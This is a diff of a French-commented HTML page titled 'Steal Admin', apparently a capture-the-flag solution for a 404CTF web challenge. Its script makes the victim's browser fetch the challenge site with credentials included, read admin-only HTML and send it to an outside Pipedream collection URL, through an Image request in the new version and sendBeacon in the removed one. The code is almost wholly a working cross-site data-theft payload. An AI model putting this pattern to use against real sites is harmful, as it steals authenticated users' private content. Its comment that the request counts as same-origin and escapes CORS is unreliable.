@@ -5,26 +5,36 @@
     <title>Steal Admin</title>
   </head>
   <body>
+    <!-- 1️⃣ Zone d’affichage locale pour debug -->
     <h1>Contenu volé :</h1>
     <pre id="out">en attente…</pre>
 
-    <img src="https://eoyi24wnc60zgb.m.pipedream.net?img=1>" />
+    <!-- 2️⃣ Balise IMG de test pour confirmer que la page a bien été chargée -->
+    <img src="https://eoyi24wnc60zgb.m.pipedream.net?test=1" alt="" />
 
     <script>
       (async () => {
-        // 1️⃣ On récupère la page protégée en « first-party », donc COOKIE inclut
+        /* 3️⃣ On fait un fetch first-party vers la home du challenge.
+         — Le host “spacefleetcommand.404ctf.fr” précède toujours le @,
+           donc le cookie admin est inclus.
+         — C’est traité comme “same-origin”, pas de CORS, pas de problème. */
         const resp = await fetch("https://spacefleetcommand.404ctf.fr/", {
-          credentials: "include", // <— envoie bien le token
+          credentials: "include",
         });
 
-        // 2️⃣ On lit le HTML en clair
+        /* 4️⃣ On lit le HTML complet renvoyé (y compris les sections réservées à l’admin). */
         const html = await resp.text();
 
-        // 3️⃣ On l’affiche pour debug
+        /* 5️⃣ On l’affiche dans le <pre> pour que tu voies directement le résultat. */
         document.getElementById("out").textContent = html;
 
-        // 4️⃣ Facultatif : exfiltration vers Pipedream
-        navigator.sendBeacon("https://eoyi24wnc60zgb.m.pipedream.net", html);
+        /* 6️⃣ Exfiltration vers Pipedream avec une requête GET via Image.
+         — On encode l’HTML et on le passe en paramètre “data”.
+         — Tu peux aussi utiliser navigator.sendBeacon si tu préfères. */
+        const img = new Image();
+        img.src =
+          "https://eoyi24wnc60zgb.m.pipedream.net/?data=" +
+          encodeURIComponent(html);
       })();
     </script>
   </body>
